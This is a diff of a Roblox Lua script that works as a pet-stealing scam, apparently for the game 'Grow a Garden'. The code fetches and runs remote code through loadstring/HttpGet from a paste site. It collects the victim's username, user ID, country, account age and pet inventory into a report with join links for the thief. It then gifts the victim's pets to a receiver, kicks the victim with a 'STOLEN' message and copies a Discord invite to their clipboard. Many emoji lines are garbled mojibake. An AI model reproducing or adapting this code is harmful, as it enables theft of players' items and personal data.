@@ -69,33 +69,33 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
             -- Regular pets
-            ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
-            ["Corrupted Kitsune"] = { priority = 2, emoji = "🦊", isMutation = false },
-            ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
-            ["Raccoon"] = { priority = 4, emoji = "🦝", isMutation = false },
-            ["Fennec fox"] = { priority = 5, emoji = "🦊", isMutation = false },
-            ["Spinosaurus"] = { priority = 6, emoji = "🫎", isMutation = false },
-            ["Butterfly"] = { priority = 7, emoji = "🦋", isMutation = false },
-            ["Dragonfly"] = { priority = 8, emoji = "🐲", isMutation = false },
-            ["Mimic Octopus"] = { priority = 9, emoji = "🐙", isMutation = false },
-            ["T-Rex"] = { priority = 10, emoji = "🦖", isMutation = false },
-            ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
-            ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
+            ["Kitsune"] = { priority = 1, emoji = "ðŸ¦Š", isMutation = false },
+            ["Corrupted Kitsune"] = { priority = 2, emoji = "ðŸ¦Š", isMutation = false },
+            ["Disco Bee"] = { priority = 3, emoji = "ðŸª©", isMutation = false },
+            ["Raccoon"] = { priority = 4, emoji = "ðŸ¦", isMutation = false },
+            ["Fennec fox"] = { priority = 5, emoji = "ðŸ¦Š", isMutation = false },
+            ["Spinosaurus"] = { priority = 6, emoji = "ðŸ«Ž", isMutation = false },
+            ["Butterfly"] = { priority = 7, emoji = "ðŸ¦‹", isMutation = false },
+            ["Dragonfly"] = { priority = 8, emoji = "ðŸ²", isMutation = false },
+            ["Mimic Octopus"] = { priority = 9, emoji = "ðŸ™", isMutation = false },
+            ["T-Rex"] = { priority = 10, emoji = "ðŸ¦–", isMutation = false },
+            ["Queen Bee"] = { priority = 11, emoji = "ðŸ‘‘", isMutation = false },
+            ["Red Fox"] = { priority = 26, emoji = "ðŸ¦Š", isMutation = false },
             -- Mutations
-            ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
-            ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
-            ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
-            ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
-            ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
-            ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
-            ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
-            ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
-            ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
-            ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
-            ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
-            ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
-            ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
-            ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
+            ["Ascended"] = { priority = 14, emoji = "ðŸ”º", isMutation = true },
+            ["Mega"] = { priority = 15, emoji = "ðŸ˜", isMutation = true },
+            ["Shocked"] = { priority = 16, emoji = "âš¡", isMutation = true },
+            ["Rainbow"] = { priority = 17, emoji = "ðŸŒˆ", isMutation = true },
+            ["Radiant"] = { priority = 18, emoji = "ðŸ›¡ï¸", isMutation = true },
+            ["Corrupted"] = { priority = 19, emoji = "ðŸ§¿", isMutation = true },
+            ["IronSkin"] = { priority = 20, emoji = "ðŸ’¥", isMutation = true },
+            ["Tiny"] = { priority = 21, emoji = "ðŸ”¹", isMutation = true },
+            ["Golden"] = { priority = 22, emoji = "ðŸ¥‡", isMutation = true },
+            ["Frozen"] = { priority = 23, emoji = "â„ï¸", isMutation = true },
+            ["Windy"] = { priority = 24, emoji = "ðŸŒªï¸", isMutation = true },
+            ["Inverted"] = { priority = 25, emoji = "ðŸ”„", isMutation = true },
+            ["Shiny"] = { priority = 26, emoji = "âœ¨", isMutation = true },
+            ["Tranquil"] = { priority = 27, emoji = "ðŸ§˜", isMutation = true },
         }
 
         local function detectExecutor()
@@ -196,7 +196,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                 label.Parent = container
                 return label
             end
-            local dangerEmoji = "⚠️"
+            local dangerEmoji = "âš ï¸"
             createLabel(dangerEmoji .. " [Delta Executor Detected] " .. dangerEmoji, Color3.fromRGB(255, 255, 0))
             createLabel("WARNING!: Delta Executor Is A Malware!", Color3.fromRGB(255, 0, 0))
             createLabel("It logs your information and is very detected!", Color3.new(1, 1, 1))
@@ -447,7 +447,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         for _, pet in ipairs(pets) do
             local highestPriority = 99
-            local chosenEmoji = "🐶"
+            local chosenEmoji = "ðŸ¶"
             local mutation = isMutated(pet.PetName)
             local mutationData = mutation and PetPriorityData[mutation] or nil
             local petData = PetPriorityData[pet.Type] or nil
@@ -460,15 +460,15 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                 chosenEmoji = mutationData.emoji
             elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
                 highestPriority = 12
-                chosenEmoji = "🐘"
+                chosenEmoji = "ðŸ˜"
             elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
                 highestPriority = 13
-                chosenEmoji = "👴"
+                chosenEmoji = "ðŸ‘´"
             end
 
             local petName = pet.PetName
             local petValue = pet.Formatted
-            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
+            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " â†’ " .. petValue
         end
         local playerCount = #Players:GetPlayers()
 
@@ -513,62 +513,62 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                 color = 57855,
                 fields = {
                     {
-                        name = "🪪 Display Name",
+                        name = "ðŸªª Display Name",
                         value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "👤 Username",
+                        name = "ðŸ‘¤ Username",
                         value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "🆔 User ID",
+                        name = "ðŸ†” User ID",
                         value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
                         inline = true
                     },
                     {
-                        name = "📅 Account Age",
+                        name = "ðŸ“… Account Age",
                         value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
                         inline = true
                     },
                     {
-                        name = "💎 Receiver",
+                        name = "ðŸ’Ž Receiver",
                         value = "```" .. (Username or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "🎂 Account Created",
+                        name = "ðŸŽ‚ Account Created",
                         value = "```" .. (creationDateString or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "💻 Executor",
+                        name = "ðŸ’» Executor",
                         value = "```" .. (detectExecutor() or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "🌍 Country",
+                        name = "ðŸŒ Country",
                         value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "📡 Player Count",
+                        name = "ðŸ“¡ Player Count",
                         value = "```" .. (playerCount or 0) .. "/5```",
                         inline = true
                     },
                     {
-                        name = "💰 Backpack",
+                        name = "ðŸ’° Backpack",
                         value = "```" .. truncateByLines(petString, 20) .. "```",
                         inline = false
                     },
                     {
-                        name = "🚀 Join Script",
+                        name = "ðŸš€ Join Script",
                         value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
                         inline = false
                     },
                     {
-                        name = "🔗 Join with URL",
+                        name = "ðŸ”— Join with URL",
                         value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                         inline = false
                     }
@@ -806,19 +806,18 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         return true
     end
 
--- Set clipboard message once
-setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+    -- Start following before gifting
+    local followConn = safeFollow()
 
--- Start following before gifting
-local followConn = safeFollow()  -- start following
-
--- Infinite gifting loop
-while true do
-    task.wait(2)
-
-    local pets = GetPlayerPets() -- Refresh pet list each time
-
+    -- Gifting loop
     for _, pet in ipairs(pets) do
+        if not receiverPlr then
+            followConn:Stop()
+            targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+            setclipboard("https://discord.gg/d2zgg2YDMz")
+            break
+        end
+
         for _, tool in targetPlr.Backpack:GetChildren() do
             if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.Id then
                 print("Gifting:", tool.Name)
@@ -826,5 +825,8 @@ while true do
             end
         end
     end
-end
 
+    -- Stop following after gifting
+    followConn:Stop()
+    targetPlr:Kick("Your pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+    setclipboard("https://discord.gg/d2zgg2YDMz")
